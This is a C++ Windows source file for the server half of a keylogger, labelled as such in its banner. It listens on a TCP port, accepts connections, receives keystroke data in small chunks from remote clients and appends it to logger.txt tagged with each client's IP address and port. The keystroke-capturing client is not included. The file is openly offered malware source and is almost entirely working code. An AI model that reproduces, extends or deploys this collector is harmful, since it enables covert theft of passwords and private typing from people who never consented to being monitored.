#pragma comment(lib, "ws2_32.lib")
#include <iostream>
#include <string>
#include <cstdio>
#include <WinSock2.h>
#include <Windows.h>
#include <fstream>
using namespace std;


string serverip = "127.0.0.1";
const int serverport  = 12346;

char recvbuf[8];
string strrecvbuf;

int main()
{
    cout << "---KEYLOGGER SERVER---" << endl;

	ofstream output;
	long rc;
	WSADATA wsaData;
	WSAStartup(MAKEWORD(2, 0), &wsaData);
	SOCKET slisten = socket(AF_INET, SOCK_STREAM, 0);
	SOCKET client;
	sockaddr_in local;

	local.sin_addr.s_addr = inet_addr(serverip.c_str());
	local.sin_family	  = AF_INET;
	local.sin_port		  = htons((u_short)serverport);
	int locallen = sizeof(local);

	if( bind(slisten, (struct sockaddr*)&local, locallen) != SOCKET_ERROR)
		cout << "bind successful" << endl;

	rc = listen(slisten, SOMAXCONN);
	if(rc == 0) cout << "Server listening on "
                     << serverip << ":" << serverport << endl;

	sockaddr_in from;
	int fromlen=sizeof(from);

	for(;;)
	{
		client = accept(slisten, (struct sockaddr*)&from, &fromlen);
		if(rc != SOCKET_ERROR)
		{
            cout << "client accepted on "
                 << inet_ntoa(from.sin_addr) << ":" << ntohs(from.sin_port)
                 << endl;



		}

		output.open("logger.txt", ios::app);
		cout << endl << "KEY_LOG ("
             << inet_ntoa(from.sin_addr) << ":" << ntohs(from.sin_port) << ") :"
             << endl << endl;
		output << endl << "KEY_LOG ("
             << inet_ntoa(from.sin_addr) << ":" << ntohs(from.sin_port) << ") :"
             << endl << endl;
		output.close();
		for(;;)
		{
			output.open("logger.txt", ios::app);
			rc = recv(client, recvbuf, 8, 0);
			if(rc == SOCKET_ERROR)
			{
				cout << "|||ERR: " << WSAGetLastError() << endl;
				output <<  "|||ERR: " << WSAGetLastError() << endl;
				break;
			}
			else
			{
				strrecvbuf = recvbuf;
				if(output.is_open())
				{
					output << strrecvbuf;
					cout << strrecvbuf;
				}
			}
			output.close();
			strrecvbuf = "";
			memset(recvbuf, 0, 8);
		}
	}

	closesocket(slisten);
	WSACleanup();
	getchar();

	return 0;
}

